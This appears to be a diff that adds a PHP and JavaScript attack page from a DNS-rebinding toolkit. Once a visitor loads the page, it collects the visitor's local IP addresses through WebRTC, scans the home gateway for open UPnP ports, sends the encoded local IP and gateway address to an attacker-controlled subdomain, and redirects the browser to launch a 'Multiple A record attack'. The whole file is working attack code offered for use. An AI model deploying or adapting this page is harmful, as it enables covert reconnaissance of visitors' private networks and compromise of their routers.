@@ -1,0 +1,230 @@
+<?php
+
+//The main.html file is responsible for port scanning the gateway and finding the open UPnP port, then redirecting the browser.
+
+$debugmode = "off"; //Set this to "on" to turn on debugging
+//Here we are getting the current Cookie parameters.  
+//We need to make this cookie valid for all subdomains
+$currentCookieParams = session_get_cookie_params(); 
+
+//Turn the queried HTTP Host Header into an array to count # of subdomains
+$cdns = explode(".", $_SERVER["HTTP_HOST"]);
+$cdns_ct = count($cdns);
+//If there are more than 2 subdomains, take the last two for the domain value
+if ($cdns_ct > 2)
+{
+	$rootDomain = ".".$cdns[$cdns_ct-2].".".$cdns[$cdns_ct-1];
+}
+else
+{
+	$rootDomain = $_SERVER["HTTP_HOST"];
+	//echo $cdns_ct;
+}
+
+session_set_cookie_params( 
+    $currentCookieParams["lifetime"], 
+    $currentCookieParams["path"], 
+    $rootDomain, 
+     false,  //$currentCookieParams["secure"], 
+    false //$currentCookieParams["httponly"] 
+); 
+//Start the session
+session_start();
+$browser = get_browser(null, true);
+$_SESSION["browser"] =  $browser['browser'];
+if ($debugmode == "on")
+{
+	echo $_SESSION["browser"];
+	$_SESSION["debug"] = "on";
+}
+//Setup uniqueid subdomain.  Since Chrome and Firefox work, set all browsers to f.  the f prefix will execute Multiple A record attack
+if ($_SESSION["browser"] )//== "Firefox")
+{
+	$_SESSION["uid"] = uniqid("f");
+}
+else
+{
+	$_SESSION["uid"] = uniqid("d");
+}
+	
+$_SESSION["domain"] = $rootDomain;
+//echo $rootDomain;
+
+?>
+
+
+<html>
+
+<meta http-equiv="refresh" content="1200; URL=http://<?php echo $_SESSION["uid"]; echo $_SESSION["domain"]?>/wopen.html">
+<script>
+<?php
+//This is where we will set our dynamic variables up
+include 'config.php';
+echo 'var uniqdom = "' . $_SESSION["uid"] . $_SESSION["domain"] . '";';
+echo 'var ports = ' . $ports . ';';
+echo 'var portfinalresort = ' . $portfinalresort . ';';
+
+?>
+var postint = "";
+var portsopen = [];
+//var gws = [1,254,253,2,3];
+function pausecomp(millis) {
+  var date = new Date();
+  var curDate = null;
+  do { curDate = new Date(); }
+  while(curDate-date < millis);
+}
+function httpGet(theUrl) {
+    var xmlHttp = null;
+
+    xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", theUrl, false );
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
+}
+function httpPost(theUrl,theText) {
+    var xmlHttp = null;
+
+    xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "POST", theUrl, false );
+    xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+    xmlHttp.send(theText);
+    return xmlHttp.responseText;
+}
+window.onerror = handleError;
+function handleError(message, url, line) {
+  if(message.match(/Script error|Error loading script/))
+  {
+	<?php if (debugmode == "on")
+	{
+		echo 'document.getElementById("divOutput").innerHTML += "OPEN!";';
+	}
+	?> 
+	var parser = document.createElement('a');
+	parser.href = url;
+	portsopen[portsopen.length] = parser.port;
+  }
+}
+<?php //Here is the function to gather local IPs add extra OR in grepSDP for candidate string?>
+function enumLocalIPs(cb) {
+  var RTCPeerConnection = window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
+  if (!RTCPeerConnection) return false;
+  var addrs = Object.create(null);
+  addrs['0.0.0.0'] = false;
+  function addAddress(newAddr) {
+    if (newAddr in addrs) return;
+    addrs[newAddr] = true;
+    cb(newAddr);
+  }
+  function grepSDP(sdp) {
+    var hosts = [];
+    sdp.split('\r\n').forEach(function (line) {
+      if (~line.indexOf('a=candidate') || ~line.indexOf('candidate:')) {
+        var parts = line.split(' '),
+            addr = parts[4],
+            type = parts[7];
+        if (type === 'host') addAddress(addr);
+      } else if (~line.indexOf('c=')) {
+        var parts = line.split(' '),
+        addr = parts[2];
+        addAddress(addr);
+      }
+    });
+  }
+  var rtc = new RTCPeerConnection({iceServers:[]});
+  if (window.mozRTCPeerConnection) rtc.createDataChannel('', {reliable:false});
+  rtc.onicecandidate = function (evt) {
+    if (evt.candidate) grepSDP(evt.candidate.candidate);
+  };
+  setTimeout(function() {
+    rtc.createOffer(function (offerDesc) {
+      grepSDP(offerDesc.sdp);
+      rtc.setLocalDescription(offerDesc);
+    //}, function (e) {});
+    }, function (e) {}, {mandatory:{OfferToReceiveAudio:true, OfferToReceiveVideo:false}});
+  }, 0);//500);
+  return true;
+}
+<?php //Here is where we start the show.  We are getting the local IP and posting it to the subdomain ip/u0 base64 encoded ?>
+var u0 = "";
+var newip = "";
+var subnet = "";
+function go() {
+	enumLocalIPs(function(localIp) {
+	<?php //Get the localIp ?>
+	<?php if (debugmode == "on")
+		{
+	    		echo 'document.getElementById(\'localips\').innerHTML += localIp + \'<br>\';';
+		}
+	?> 
+	<?php //Store the localIp ?>
+		u0 = u0 + ":" + localIp;
+	<?php //Send the localIp ?>
+		//var postint = httpPost("http://d0.<?php echo $_SESSION["uid"]; echo $_SESSION["domain"]?>/u0.php",btoa(u0));
+	<?php //Do the portscan of the returned ip address.  ********NEED TO ADD ARRAY POSSIBILITY********** ?>
+  		subnet = localIp.replace(/(\d+\.\d+\.\d+)\.\d+/, '$1.');
+			for (index = 0; index < ports.length; index++)
+			{
+				probeIp(subnet + "1", ports[index], 500);
+				probeIp(subnet + "254", ports[index], 500);
+				//probeIp(subnet + "1", portsfinalresort[0], 500);
+				//probeIp(subnet + "254", portsfinalresort[0], 500);
+			} 
+	
+	}
+	) 
+	|| (document.getElementById('localips').innerHTML = 'WebRTC seems not to be supported');
+}
+	<?php //Send the localIp ?>
+	function postPort (ip, port) {
+		<?php //Send the localIp;gateway ?>
+		pdata = u0 + ";" + ip;
+		var postint = httpPost("http://d0." + uniqdom + "/u0.php",btoa(pdata));
+		<?php //Here we go to the new port open.  We use the first open port found with 80 as the last resort ?>
+		window.location.assign("http://" + uniqdom + ":" + port + "/wopen.html");
+		}
+	<?php //Here is the function to probe an IP address for open ports ?>
+	function probeIp(ip, port, timeout) {
+
+	  var start = Date.now();
+	  var done = false;
+	  var img = document.createElement('img');
+	  var clean = function() {
+	    if (!img) return;
+	    document.body.removeChild(img);
+	    img = null;
+	  };
+	  var onResult = function(success) {
+	    if (done) return;
+	    done = true;
+	    clean();
+	    if (Date.now() - start < timeout)
+	    {
+	     	postPort(ip, port);
+	    }
+	    //cb(ip, port, Date.now() - start < timeout);
+	  };
+	  document.body.appendChild(img);
+	  img.style.display = 'none';
+	  img.onload = function() { onResult(true); };
+	  img.onerror = function() { onResult(false); };
+	  img.src = 'http://' + ip + ':' + port ; 
+	}
+go();
+</script>
+<body>
+<?php if (debugmode == "on")
+{
+    	echo "Hello ";
+	echo $_SESSION["uid"];
+	echo $_SESSION["domain"];
+    	echo '<div id="localips"></div>';
+    	echo '<div id="divOutput"></div>';
+}
+else
+{
+	echo '<img style="margin:0px auto;display:block" src="ajax-loader.gif" align="middle"></img>';
+}
+?>
+</body>
+</html>
